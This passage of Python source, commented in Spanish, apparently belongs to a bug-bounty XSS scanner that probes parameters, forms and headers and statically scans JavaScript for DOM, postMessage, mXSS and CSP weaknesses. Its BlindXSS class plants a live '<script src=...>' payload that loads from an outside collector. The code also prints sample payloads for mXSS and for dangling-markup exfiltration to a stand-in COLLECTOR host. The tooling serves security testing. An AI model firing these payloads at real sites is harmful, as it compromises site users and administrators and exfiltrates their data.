        self.log(f"[params+] forzando {len(self.PARAM_NAMES)} nombres de parametros "
                 f"en {len(chosen)} paginas dinamicas ({len(targets)} sondas)")
        return targets


class XSSHunter:
    """Corpus XSS por reflexion. Dos sondas por objetivo:
    1) marcador puro -> detecta reflexion y contexto exacto
    2) marcador + '">< -> mide que caracteres sobreviven crudos
    De ahi deduce gravedad SIN nunca disparar un payload funcional."""

    def __init__(self, session: requests.Session, log: Log,
                 delay: float = 0.15, timeout: float = 15.0,
                 workers: int = 1):
        self.session = session
        self.log = log
        self.delay = delay
        self.timeout = timeout
        self.workers = max(1, min(int(workers or 1), 8))
        self.api_specs: Dict[str, str] = {}

    def _parallel(self, fn, items):
        """OVERDRIVE: mapea fn sobre items. Con workers=1 queda secuencial
        (comportamiento clasico); con N, N sondas en vuelo a la vez. La red
        es el cuello de botella, no el CPU: incluso en Termux multiplica el
        rendimiento casi lineal. Devuelve solo los resultados no-None."""
        items = list(items)
        if self.workers <= 1 or len(items) <= 1:
            return [r for r in (fn(i) for i in items) if r]
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as ex:
            return [r for r in ex.map(fn, items) if r]

    @staticmethod
    def _mark() -> str:
        return "kxss" + secrets.token_hex(4) + "z"

    def _pause(self) -> None:
        time.sleep(self.delay)

    def _context(self, text: str, mark: str) -> Optional[str]:
        i = text.find(mark)
        if i < 0:
            return None
        pre = text[max(0, i - 60):i]
        post = text[i + len(mark): i + len(mark) + 40]
        if re.search(r"<script[^>]*>[^<>]*$", pre, re.I):
            return "js-string"
        m = re.search(r"=\s*([\"'])[^\"']*$", pre)
        if m:
            return "attr-dq" if m.group(1) == '"' else "attr-sq"
        if re.search(r"/\*[^*]*$", pre) or re.search(r"<!--[^>]*$", pre):
            return "comment"
        if post.lstrip().startswith("<") or re.search(r"<[a-z][\w:.-]*\s*$", pre, re.I):
            return "tag"
        return "body"

    def _probe(self, url: str, param: str, value: str,
               method: str = "GET", base_data: Optional[Dict[str, str]] = None) -> Optional[requests.Response]:
        self._pause()
        try:
            if method == "POST":
                data = dict(base_data or {})
                data[param] = value
                return self.session.post(url, data=data, timeout=self.timeout)
            parts = urlparse(url)
            q = [(k, v) for k, v in parse_qsl(parts.query) if k != param]
            q.append((param, value))
            return self.session.get(urlunparse(parts._replace(query=urlencode(q))),
                                    timeout=self.timeout)
        except Exception as exc:
            self.log(f"[xss] XX {urlparse(url).path}?{param}= · red: {str(exc)[:60]}")
            return None

    def _verdict(self, ctx: Optional[str], raw: Dict[str, bool]) -> Tuple[str, str]:
        """Devuelve (gravedad, razon)."""
        if ctx in ("body", "tag") and raw.get("<"):
            return "alta", "escape de HTML factible: < sobrevive crudo"
        if ctx == "attr-dq" and raw.get('"'):
            return "alta", "escape de atributo factible: comilla doble cruda"
        if ctx == "attr-sq" and raw.get("'"):
            return "alta", "escape de atributo factible: comilla simple cruda"
        if ctx == "js-string" and (raw.get("'") or raw.get('"')):
            return "media", "cadena JS rompible: comilla cruda dentro de script"
        if ctx == "comment":
            return "media", "reflejado dentro de comentario HTML"
        if any(raw.values()):
            return "baja", "algunos caracteres crudos pero sin escape claro"
        return "info", "reflejado pero sanitizado/codificado"

    def _evidence(self, text: str, mark: str, window: int = 60) -> str:
        i = text.find(mark)
        if i < 0:
            return ""
        a = max(0, i - window)
        return text[a: i + len(mark) + window].replace("\n", " ").strip()

    def _finding(self, kind: str, target: str, param: str, method: str,
                 gravedad: str, razon: str, evidence: str, ctx: Optional[str]) -> Dict[str, Any]:
        return {
            "type": kind,
            "target": target,
            "param": param,
            "method": method,
            "context": ctx,
            "severity": gravedad,
            "reason": razon,
            "evidence": evidence[:300],
            "veredicto": {
                "gravedad": gravedad,
                "primeros": "desconocido: revisar si ya esta reportado antes de enviar",
                "reglas": "OK: sonda pasiva de reflexion, sin ejecucion ni payloads",
            },
        }

    def test_param(self, url: str, param: str, method: str = "GET",
                   base_data: Optional[Dict[str, str]] = None,
                   label: str = "") -> Optional[Dict[str, Any]]:
        mark = self._mark()
        r = self._probe(url, param, mark, method, base_data)
        if r is None or mark not in (r.text or ""):
            self.log(f"[xss] {method} {urlparse(url).path}?{param}= · sin reflexion")
            return None
        ctx = self._context(r.text, mark)

        mark2 = self._mark()
        r2 = self._probe(url, param, mark2 + "'\"><", method, base_data)
        raw = {"'": False, '"': False, ">": False, "<": False}
        if r2 is not None:
            j = (r2.text or "").find(mark2)
            if j >= 0:
                tail = r2.text[j + len(mark2): j + len(mark2) + 4]
                raw = {"'": tail.startswith("'"), '"': tail[1:2] == '"',
                       ">": tail[2:3] == ">", "<": tail[3:4] == "<"}

        gravedad, razon = self._verdict(ctx, raw)
        ev = self._evidence(r.text, mark)
        tag = "💥"
        self.log(f"{tag} [xss] {method} {urlparse(url).path}?{param}= · REFLEJADA · "
                 f"contexto: {ctx} · crudos: " + "".join(c for c, ok in raw.items() if ok))
        return self._finding("XSS reflejado", _norm(url), param, method, gravedad,
                              f"{razon} · contexto {ctx}", ev, ctx)

    # ---------- bateria 1: parametros GET ----------
    def test_params(self, targets: List[Dict[str, Any]], max_params: int = 60) -> List[Dict[str, Any]]:
        self.log("[xss] === bateria GET: parametros de URL ===")
        findings = self._parallel(
            lambda t: self.test_param(t["url"], t["param"]), targets[:max_params])
        self.log(f"[xss] GET terminado · {len(findings)} reflexiones encontradas "
                 f"({self.workers} worker{'s' if self.workers > 1 else ''})")
        return findings

    # ---------- bateria 2: formularios ----------
    def test_forms(self, spider_out: Dict[str, Any], max_forms: int = 40) -> List[Dict[str, Any]]:
        self.log("[xss] === bateria FORMULARIOS: reinyeccion campo por campo ===")
        pares = [(form, field)
                 for form in spider_out.get("forms", [])[:max_forms]
                 for field in form["fields"][:8]]

        def _probe_form(par):
            form, field = par
            f = self.test_param(form["url"], field, form["method"].upper(),
                                base_data={x: "x" for x in form["fields"]})
            if f:
                f["type"] = "XSS en formulario"
            return f

        findings = self._parallel(_probe_form, pares)
        self.log(f"[xss] FORMS terminado · {len(findings)} reflexiones encontradas")
        return findings

    # ---------- bateria 3: cabeceras ----------
    def test_headers(self, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        self.log("[xss] === bateria CABECERAS: User-Agent / Referer / X-Forwarded-For ===")
        findings: List[Dict[str, Any]] = []
        base_url = spider_out.get("base_url", "")
        if not base_url:
            return findings
        urls = [base_url] + [urljoin(base_url, p) for p in spider_out.get("pages", [])[:6]]
        for header in ("User-Agent", "Referer", "X-Forwarded-For"):
            mark = self._mark()
            hit_url = None
            r = None
            for u in urls:
                self._pause()
                try:
                    r = self.session.get(u, headers={header: mark}, timeout=self.timeout)
                except Exception as exc:
                    self.log(f"[xss] header {header} · red: {str(exc)[:60]}")
                    continue
                if mark in (r.text or ""):
                    hit_url = u
                    break
            if hit_url is None:
                self.log(f"[xss] header {header} · sin reflexion en {len(urls)} paginas")
                continue
            ctx = self._context(r.text, mark)
            gravedad, razon = self._verdict(ctx, {"'": False, '"': False, ">": False, "<": False})
            ev = self._evidence(r.text, mark)
            self.log(f"💥 [xss] header {header} · REFLEJADO en {urlparse(hit_url).path} · contexto: {ctx}")
            findings.append(self._finding(
                f"XSS via header {header}", str(r.url), header, "HEADER",
                "media" if ctx == "body" else gravedad,
                f"{razon} · contexto {ctx} · tipico en paginas de error o logs visibles",
                ev, ctx))
        self.log(f"[xss] HEADERS terminado · {len(findings)} reflexiones encontradas")
        return findings

    # ---------- bateria 4: DOM (estatico) ----------
    def test_dom(self, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        self.log("[xss] === bateria DOM: sinks + sources en JavaScript ===")
        findings: List[Dict[str, Any]] = []
        for cand in spider_out.get("dom_candidates", []):
            self.log(f"💥 [dom] {cand['source']} · sink {cand['sink']} alimenta con {cand['source_pattern']}")
            findings.append({
                "type": "XSS-DOM potencial",
                "target": cand["source"],
                "param": cand["source_pattern"],
                "method": "DOM",
                "context": "dom",
                "severity": "media",
                "reason": f"sink {cand['sink']} + fuente controlable {cand['source_pattern']}",
                "evidence": f"sink: {cand['sink']} | fuente: {cand['source_pattern']}",
                "veredicto": {
                    "gravedad": "media",
                    "primeros": "desconocido: revisar antes de reportar",
                    "reglas": "OK: analisis estatico del JS publico del sitio",
                },
            })
        if not findings:
            self.log("[dom] ningun sink alimentado por fuente controlable")
        return findings


class BlindXSS:
    """Siembra payloads GHOSTHOOK en campos de texto de formularios para que
    se ejecuten cuando un usuario con privilegios abra la vista (blind XSS).
    ESCRIBE en el objetivo: solo activarla en programas que permiten stored o
    blind XSS, o en laboratorios propios. Nunca se auto-ejecuta."""
    def __init__(self, session: requests.Session, log: Log,
                 delay: float = 0.15, timeout: float = 15.0):
        self.session = session
        self.log = log
        self.delay = delay
        self.timeout = timeout

    def plant(self, spider_out: Dict[str, Any], endpoint: str,
              max_forms: int = 15) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        if not endpoint:
            self.log("[blind] sin blind_endpoint: pasa la URL del worker "
                     "GHOSTHOOK (ej. https://ghosthook.xxx.workers.dev) para "
                     "activar esta bateria")
            return findings
        self.log("[blind] === bateria BLIND (ESCRIBE en el blanco): solo "
                 "programas con stored/blind XSS permitido o labs propios ===")
        payload = f'<script src="{endpoint.rstrip("/")}/x.js"></script>'
        forms = spider_out.get("forms", [])[:max_forms]
        if not forms:
            self.log("[blind] sin formularios descubiertos: nada que sembrar")
            return findings
        for form in forms:
            fields = [f for f in form.get("fields", [])[:8]]
            if not fields:
                continue
            field = max(fields, key=len)  # campo de texto mas largo
            data = {x: "x" for x in fields}
            data[field] = payload
            time.sleep(self.delay)
            try:
                if form["method"].upper() == "POST":
                    r = self.session.post(form["url"], data=data,
                                          timeout=self.timeout)
                else:
                    r = self.session.get(form["url"], params=data,
                                          timeout=self.timeout)
                status = r.status_code
            except Exception as exc:
                self.log(f"[blind] XX {urlparse(form['url']).path} · {str(exc)[:60]}")
                continue
            findings.append({
                "severity": "info", "type": "Blind XSS sembrado",
                "param": field, "target": form["url"],
                "evidence": f"payload GHOSTHOOK inyectado en '{field}' "
                            f"({form['method'].upper()} · HTTP {status})",
                "verdict": "esperar beacons en el panel del colector; "
                           "reportar solo si el programa acepta blind/stored XSS"})
            self.log(f"[blind] sembrado en '{field}' @ "
                     f"{urlparse(form['url']).path} (HTTP {status})")
        self.log(f"[blind] BLIND terminado · {len(findings)} siembras; "
                 "los beacons llegan al panel del worker")
        return findings


class XSSPro:
    """Bateria XSS-PRO (v0.20.0): seis vectores avanzados que el corpus basico
    no cubre. Filosofia identica al corpus: marcadores y analisis estatico,
    NUNCA payloads funcionales disparados contra el blanco.

      1) postmessage : listener de message sin check de origen con sink peligroso
      2) dyn_script  : carga dinamica de <script> con src influible (query/hash/URL)
      3) mxss        : sinks de re-serializacion (innerHTML = x.innerHTML) y
                       contenedores mutables (svg/math/noscript/template)
      4) dangling    : reflexion en atributo con comilla cruda -> markup colgante:
                       exfiltracion pasiva de contenido SIN ejecutar JS
                       (la via cuando CSP bloquea scripts)
      5) stored      : marcador POST que reaparece en otra pagina (XSS almacenado)
      6) csp_bypass  : politicas CSP debiles con vector de bypass concreto

    Los modulos 1-3 y 6 son solo lectura. El 5 escribe un marcador inerte
    (igual que BLIND): activar solo en programas que lo permitan o en labs.
    """

    MAX_TEXTS = 45        # paginas HTML + archivos JS escaneados (limite duro)
    MAX_PARAMS = 40
    MAX_FORMS = 10

    # ---- patrones estaticos ----
    PM_LISTENERS = re.compile(r'addEventListener\s*\(\s*["\']message["\']|\bonmessage\s*=', re.I)
    PM_SINKS = ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write",
                "eval(", "Function(", "srcdoc", "location.href", "location.assign",
                "location.replace", ".html(")
    PM_CHECKS = re.compile(r'\.origin|event\.origin|e\.origin|\.source\s*===|data\.origin', re.I)

    DS_CREATE = re.compile(r"createElement\s*\(\s*['\"]script", re.I)
    DS_GETSCRIPT = re.compile(r"getScript\s*\(", re.I)
    DS_TAINTS = ("location.search", "location.hash", "location.href", "document.URL",
                 "URLSearchParams", "getParameter", "document.referrer")

    MX_RESERIAL = re.compile(r"\.(?:innerHTML|outerHTML)\s*=\s*[\w$.]+\.(?:innerHTML|outerHTML)", re.I)
    MX_SINK = re.compile(r"\.(?:innerHTML|outerHTML|insertAdjacentHTML)\s*=", re.I)
    MX_CONTAINERS = ("<svg", "<math", "<noscript", "<template")

    # hosts con JSONP / librerias que permiten derivar JS si estan en script-src
    CSP_JSONP_HOSTS = ("googleapis.com", "gstatic.com", "google.com", "googleusercontent.com",
                       "recaptcha.net", "youtube.com", "ytimg.com", "jsdelivr.net",
                       "unpkg.com", "cdnjs.cloudflare.com", "vimeo.com", "twitter.com",
                       "bing.com", "cloudflare.com", "akamaihd.net", "doubleclick.net")

    def __init__(self, session: requests.Session, log: Log,
                 delay: float = 0.15, timeout: float = 15.0,
                 workers: int = 1):
        self.session = session
        self.log = log
        self.delay = delay
        self.timeout = timeout
        self.workers = max(1, min(int(workers or 1), 8))
        self.csp_inline_ok = None   # lo llena scan_csp_bypass para dangling

    def _pause(self) -> None:
        time.sleep(self.delay)

    def _parallel(self, fn, items):
        """OVERDRIVE: ver XSSHunter._parallel. workers=1 = clasico."""
        items = list(items)
        if self.workers <= 1 or len(items) <= 1:
            return [r for r in (fn(i) for i in items) if r]
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as ex:
            return [r for r in ex.map(fn, items) if r]

    @staticmethod
    def _mark() -> str:
        return "kxp" + secrets.token_hex(4) + "z"

    def _finding(self, kind: str, target: str, param: str, gravedad: str,
                 razon: str, evidence: str, ctx: str = "-") -> Dict[str, Any]:
        return {
            "type": kind,
            "target": target,
            "param": param,
            "method": "estatico",
            "context": ctx,
            "severity": gravedad,
            "reason": razon,
            "evidence": evidence[:300],
            "veredicto": {
                "gravedad": gravedad,
                "primeros": "desconocido: revisar si ya esta reportado antes de enviar",
                "reglas": "OK: analisis estatico de codigo publico y sondas de "
                          "marcador, sin payloads funcionales",
            },
        }

    # ---------- recoleccion de texto (paginas + JS) ----------
    def _collect_texts(self, base_url: str, spider_out: Dict[str, Any]) -> List[Dict[str, str]]:
        out: List[Dict[str, str]] = []
        seen_js: set = set()
        pages = [base_url] + [p for p in spider_out.get("pages", []) if p != base_url]
        for page in pages[:self.MAX_TEXTS]:
            if len(out) >= self.MAX_TEXTS:
                break
            self._pause()
            try:
                r = self.session.get(urljoin(base_url, page), timeout=self.timeout)
            except Exception:
                continue
            if r.status_code != 200 or "html" not in (r.headers.get("Content-Type") or ""):
                continue
            out.append({"kind": "html", "origin": page, "text": r.text})
            for src in re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r.text)[:5]:
                js = urljoin(page, src)
                if js in seen_js or len(out) >= self.MAX_TEXTS:
                    continue
                seen_js.add(js)
                self._pause()
                try:
                    jr = self.session.get(js, timeout=self.timeout)
                    if jr.status_code == 200 and len(jr.text) < 400_000:
                        out.append({"kind": "js", "origin": js, "text": jr.text})
                except Exception:
                    pass
        for js in spider_out.get("js_files", [])[:self.MAX_TEXTS - len(out)]:
            if js in seen_js:
                continue
            seen_js.add(js)
            self._pause()
            try:
                jr = self.session.get(js, timeout=self.timeout)
                if jr.status_code == 200 and len(jr.text) < 400_000:
                    out.append({"kind": "js", "origin": js, "text": jr.text})
            except Exception:
                pass
        return out

    # ---------- 1) postMessage XSS ----------
    def scan_postmessage(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for m in self.PM_LISTENERS.finditer(t["text"]):
                win = t["text"][m.start(): m.start() + 1500]
                sinks = [s for s in self.PM_SINKS if s.lower() in win.lower()]
                if not sinks:
                    continue
                line = t["text"].count("\n", 0, m.start()) + 1
                checked = bool(self.PM_CHECKS.search(win))
                ev = (f"{t['origin']} (linea {line}) listener message -> "
                      f"{', '.join(sinks[:3])}")
                if checked:
                    findings.append(self._finding(
                        "postmessage-xss", t["origin"], "-", "media",
                        "listener de message con sink peligroso y chequeo de origen "
                        "cercano: auditar a mano si el chequeo es bypasseable "
                        "(comparacion con null, por prefijo, o ausente en un handler)",
                        ev, "js"))
                else:
                    findings.append(self._finding(
                        "postmessage-xss", t["origin"], "-", "alta",
                        "listener de message SIN chequeo de origen escribe en sink "
                        "peligroso: cualquier pagina (o ventana hija) puede hacer "
                        "postMessage y ejecutar en este contexto",
                        ev, "js"))
                    self.log(f"[xsspro] 💥 postMessage sin origen -> {', '.join(sinks[:2])} "
                             f"en {urlparse(t['origin']).path}")
        return findings

    # ---------- 2) carga dinamica de script ----------
    def scan_dyn_script(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            text = t["text"]
            hits = list(self.DS_CREATE.finditer(text)) + list(self.DS_GETSCRIPT.finditer(text))
            for m in hits:
                win = text[max(0, m.start() - 800): m.start() + 1200]
                tainted = any(tap in win for tap in self.DS_TAINTS)
                has_src = ".src" in win or "getScript" in win
                if not (tainted or has_src):
                    continue
                line = text.count("\n", 0, m.start()) + 1
                ev = f"{t['origin']} (linea {line}) {m.group(0)} + src dinamico"
                if tainted:
                    findings.append(self._finding(
                        "dyn-script", t["origin"], "-", "alta",
                        "script creado con createElement/getScript y su src depende de "
                        "datos de la URL (query/hash): un atacante controla la fuente "
                        "del script inyectando ?param=//malvado/x.js",
                        ev, "js"))
                    self.log(f"[xsspro] 💥 carga dinamica influible en "
                             f"{urlparse(t['origin']).path}")
                else:
                    findings.append(self._finding(
                        "dyn-script", t["origin"], "-", "info",
                        "carga dinamica de script presente: verificar a mano si el src "
                        "puede ser influido por datos del usuario",
                        ev, "js"))
        return findings

    # ---------- 3) mXSS ----------
    def scan_mxss(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            text = t["text"]
            for m in self.MX_RESERIAL.finditer(text):
                line = text.count("\n", 0, m.start()) + 1
                findings.append(self._finding(
                    "mxss", t["origin"], "-", "alta",
                    "re-serializacion: x.innerHTML = y.innerHTML re-parsea el HTML; "
                    "payloads que mutan al re-serializar (noscript/svg/math) ejecutan "
                    "aunque el filtro del servidor limpio el original",
                    f"{t['origin']} (linea {line}) {m.group(0)} · verificacion manual: "
                    "insertar <noscript><p title=\"</noscript><img src=x onerror=...>\">",
                    "js"))
                self.log(f"[xsspro] 💥 sink de re-serializacion (mXSS) en "
                         f"{urlparse(t['origin']).path}")
            if t["kind"] == "html" and self.MX_SINK.search(text):
                low = text.lower()
                mut = [c for c in self.MX_CONTAINERS if c in low]
                if mut:
                    findings.append(self._finding(
                        "mxss", t["origin"], "-", "media",
                        f"sink innerHTML en pagina con contenedor mutable {mut[0]}: "
                        "el parser cambia de contexto dentro de estos elementos; "
                        "candidato mXSS que evita filtros de sanitizacion",
                        f"{t['origin']} sink innerHTML + {mut[0]}",
                        "html"))
        return findings

    # ---------- 4) dangling markup ----------
    def _attr_ctx(self, text: str, mark: str) -> Optional[str]:
        i = text.find(mark)
        if i < 0:
            return None
        pre = text[max(0, i - 60):i]
        m = re.search(r"=\s*([\"'])[^\"']*$", pre)
        if m:
            return "attr-dq" if m.group(1) == '"' else "attr-sq"
        if re.search(r"=\s*$", pre):
            return "attr-unquoted"
        return None

    def _probe_param(self, url: str, param: str, value: str) -> Optional[requests.Response]:
        self._pause()
        try:
            parts = urlparse(url)
            q = [(k, v) for k, v in parse_qsl(parts.query) if k != param]
            q.append((param, value))
            return self.session.get(urlunparse(parts._replace(query=urlencode(q))),
                                    timeout=self.timeout)
        except Exception:
            return None

    def _probe_dangling_target(self, tgt) -> List[Dict[str, Any]]:
        """Sonda de UN objetivo (unidad de trabajo OVERDRIVE)."""
        findings: List[Dict[str, Any]] = []
        url, param = tgt["url"], tgt["param"]
        mark = self._mark()
        r = self._probe_param(url, param, mark)
        if r is None or mark not in r.text:
            return findings
        ctx = self._attr_ctx(r.text, mark)
        if ctx not in ("attr-dq", "attr-sq", "attr-unquoted"):
            return findings
        quote = '"' if ctx == "attr-dq" else ("'" if ctx == "attr-sq" else "")
        raw = self._probe_param(url, param, mark + quote + "<")
        if raw is None or mark not in raw.text:
            return findings
        after = raw.text[raw.text.find(mark):
                         raw.text.find(mark) + len(mark) + 3]
        ok_q = quote != "" and quote in after
        ok_lt = "<" in after
        if not (ok_q or (ctx == "attr-unquoted" and ok_lt)):
            return findings
        gravedad = "alta" if (self.csp_inline_ok is False) else "media"
        razon = ("reflexion dentro de atributo con comilla cruda: se puede abrir "
                 "un atributo sin cerrar que traga el resto del HTML hasta la "
                 "proxima comila y exfiltrarlo de forma PASIVA, sin ejecutar JS")
        if self.csp_inline_ok is False:
            razon += ("; la CSP del sitio bloquea JS inline, y el markup colgante "
                      "NO depende de script-src: es la via de exfiltracion")
        ev = (f"{urlparse(url).path}?{param}= · contexto {ctx} · comilla+< crudos · "
              "marcador de verificacion manual: <img src='https://COLLECTOR/c?d=")
        findings.append(self._finding("dangling-markup", url, param,
                                      gravedad, razon, ev, ctx))
        self.log(f"[xsspro] 💥 dangling markup posible en {param} "
                 f"({ctx}) @ {urlparse(url).path}")
        return findings

    def probe_dangling(self, param_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        tgts = param_targets[:self.MAX_PARAMS]
        res = self._parallel(self._probe_dangling_target, tgts)
        return [f for sub in res for f in (sub or [])]

    # ---------- 5) XSS almacenado ----------
    def probe_stored(self, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        forms = spider_out.get("forms", [])[:self.MAX_FORMS]
        pages = spider_out.get("pages", [])[:30]
        if not forms:
            return findings
        self.log("[xsspro] stored: siembra marcadores inertes (POST) y busca "
                 "donde reaparecen")
        for form in forms:
            fields = [f for f in form.get("fields", [])[:8]]
            if not fields:
                continue
            mark = self._mark()
            field = max(fields, key=len)
            data = {x: "x" for x in fields}
            data[field] = mark
            self._pause()
            try:
                if form["method"].upper() == "POST":
                    self.session.post(form["url"], data=data, timeout=self.timeout)
                else:
                    self.session.get(form["url"], params=data, timeout=self.timeout)
            except Exception:
                continue
            for page in pages:
                if page == form["url"]:
                    continue
                self._pause()
                try:
                    r = self.session.get(urljoin(spider_out.get("base_url", ""), page),
                                         timeout=self.timeout)
                except Exception:
                    continue
                if mark in r.text:
                    findings.append(self._finding(
                        "stored-xss", page, field, "alta",
                        "el marcador enviado por formulario reaparece en otra pagina: "
                        "reflexion ALMACENADA; si los caracteres crudos sobreviven en "
                        "la vista de almacenamiento es XSS almacenado completo",
                        f"{mark[:14]}... enviado en '{field}' -> reaparece en "
                        f"{urlparse(page).path}", "stored"))
                    self.log(f"[xsspro] 💥 marcador almacenado: '{field}' se "
                             f"re-renderiza en {urlparse(page).path}")
                    break
        return findings

    # ---------- 6) CSP bypass ----------
    def scan_csp_bypass(self, base_url: str) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        try:
            self._pause()
            r = self.session.get(base_url, timeout=self.timeout)
            policy = r.headers.get("Content-Security-Policy", "") or \
                     r.headers.get("Content-Security-Policy-Report-Only", "")
        except Exception:
            return findings
        if not policy:
            self.csp_inline_ok = True
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "info",
                "el sitio no envia CSP: cualquier XSS reflejado/almacenado ejecuta "
                "sin necesitar bypass", "sin header Content-Security-Policy", "header"))
            return findings
        dirs: Dict[str, List[str]] = {}
        for part in policy.split(";"):
            toks = part.split()
            if toks:
                dirs[toks[0].lower()] = toks[1:]
        script = dirs.get("script-src") or dirs.get("default-src") or []
        self.csp_inline_ok = "'unsafe-inline'" in " ".join(script)
        ev = policy[:200]

        if self.csp_inline_ok:
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "alta",
                "script-src permite 'unsafe-inline': la CSP NO detiene scripts "
                "inyectados; cualquier XSS en la pagina ejecuta directo, la CSP es "
                "decorativa", ev, "header"))
        jsonp = [h for h in self.CSP_JSONP_HOSTS
                 if any(h in s for s in script if not s.startswith("'"))]
        if jsonp:
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "media",
                f"script-src permite {jsonp[0]}: hosts con endpoints JSONP o "
                "librerias derivables permiten cargar JS desde el dominio "
                "permitido (bypass clasico de allowlist)", ev, "header"))
        if "'strict-dynamic'" in " ".join(script):
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "info",
                "'strict-dynamic': si existe UN XSS, los scripts que este crea pueden "
                "cargar mas scripts ignorando nonce/hash (proteccion perforable)",
                ev, "header"))
        all_srcs = dirs.get("default-src") or []
        self.csp_base_missing = "base-uri" not in dirs
        if ("object-src" not in dirs and "object-src" not in
                " ".join(all_srcs) and not self.csp_inline_ok):
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "media",
                "sin object-src: plugins <object>/<embed> no estan restringidos "
                "(vector historico cuando script-src es estricto)", ev, "header"))
        if "base-uri" not in dirs:
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "media",
                "sin base-uri: un <base href> inyectado secuestra URLs relativas "
                "del sitio (forms y links apuntan al dominio del atacante)",
                ev, "header"))
        if any(s in ("*", "https:") for s in script):
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "alta",
                "script-src con wildcard o https: : la CSP no restringe el origen "
                "de scripts en la practica", ev, "header"))
        return findings

    # ---------- 7) DOM clobbering ----------
    CB_PATTERNS = (
        (re.compile(r"eval\s*\(\s*window\.", re.I), "alta",
         "eval de una propiedad de window: clobberable con id/name de elemento"),
        (re.compile(r"document\.querySelector\s*\(\s*['\"]#['\"]\s*\+", re.I), "media",
         "selector de id armado por concatenacion: un elemento con ese id cloberea la referencia"),
        (re.compile(r"window\s*\[", re.I), "media",
         "acceso dinamico a window[...]: clobberable con id/name de elemento"),
        (re.compile(r"\.(?:innerHTML|src|href)\s*=[^;]{0,60}window\.(?!location)", re.I), "media",
         "sink alimentado por una propiedad global de window clobberable con <div id=...>"),
    )
    WN_PAT = re.compile(r"window\.name", re.I)

    def scan_clobbering(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for pat, sev, razon in self.CB_PATTERNS:
                for m in pat.finditer(t["text"]):
                    line = t["text"].count("\n", 0, m.start()) + 1
                    findings.append(self._finding(
                        "dom-clobbering", t["origin"], "-", sev, razon,
                        f"{t['origin']} (linea {line}) {m.group(0)[:50]} · "
                        "verificacion manual: <div id=propiedad> para secuestrar la referencia",
                        "js"))
                    self.log(f"[xsspro] 💥 clobbering: {razon[:40]} @ "
                             f"{urlparse(t['origin']).path}")
            for m in self.WN_PAT.finditer(t["text"]):
                win = t["text"][m.start(): m.start() + 300]
                if any(s in win for s in ("innerHTML", "src", "href", "eval", "Function")):
                    line = t["text"].count("\n", 0, m.start()) + 1
                    findings.append(self._finding(
                        "dom-clobbering", t["origin"], "-", "alta",
                        "window.name alimentando un sink: cualquier pagina que "
                        "abra esta en iframe puede fijar window.name del blanco",
                        f"{t['origin']} (linea {line}) window.name -> sink", "js"))
        return findings

    # ---------- 8) prototype pollution ----------
    PP_SINKS = re.compile(r"Object\.assign\s*\(|\$\.extend\(\s*true|\bmerge\s*\(|deepMerge", re.I)
    TAINTS = ("JSON.parse", "location.search", "location.hash", "URLSearchParams",
              "document.cookie", "getParameter")

    def scan_proto(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for m in self.PP_SINKS.finditer(t["text"]):
                win = t["text"][max(0, m.start() - 600): m.start() + 800]
                line = t["text"].count("\n", 0, m.start()) + 1
                if any(x in win for x in self.TAINTS):
                    findings.append(self._finding(
                        "proto-pollution", t["origin"], "-", "alta",
                        "merge/assign de datos de la URL sin saneo: candidate a "
                        "prototype pollution (__proto__/constructor) que luego "
                        "alimenta sinks (XSS, bypass de validaciones)",
                        f"{t['origin']} (linea {line}) {m.group(0)[:40]} + taint de URL",
                        "js"))
                    self.log(f"[xsspro] 💥 prototype pollution candidate en "
                             f"{urlparse(t['origin']).path}")
        return findings

    # ---------- 9) iframe srcdoc ----------
    IF_PAT = re.compile(r"(?:srcdoc|iframe\s*\.\s*src)\s*=", re.I)

    def scan_iframe(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for m in self.IF_PAT.finditer(t["text"]):
                win = t["text"][max(0, m.start() - 600): m.start() + 600]
                line = t["text"].count("\n", 0, m.start()) + 1
                if any(x in win for x in self.TAINTS):
                    findings.append(self._finding(
                        "iframe-srcdoc", t["origin"], "-", "alta",
                        "iframe con srcdoc/src construido con datos de la URL: "
                        "HTML inyectado ejecuta dentro del iframe con el origen "
                        "del propio sitio",
                        f"{t['origin']} (linea {line}) {m.group(0)[:40]} + taint", "js"))
                    self.log(f"[xsspro] 💥 iframe srcdoc/src influible en "
                             f"{urlparse(t['origin']).path}")
        return findings

    # ---------- 10) base tag injection ----------
    def probe_base(self, param_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for tgt in param_targets[:self.MAX_PARAMS]:
            url, param = tgt["url"], tgt["param"]
            mark = self._mark()
            r = self._probe_param(url, param, mark)
            if r is None or mark not in r.text:
                continue
            raw = self._probe_param(url, param, mark + "<'")
            if raw is None or mark not in raw.text:
                continue
            after = raw.text[raw.text.find(mark): raw.text.find(mark) + len(mark) + 3]
            if "<" not in after:
                continue
            idx = raw.text.find(mark)
            head_end = raw.text.lower().find("</head>")
            if 0 <= idx < head_end if head_end > 0 else (idx < 600):
                gravedad, donde = "alta", "dentro de <head>"
            elif getattr(self, "csp_base_missing", True):
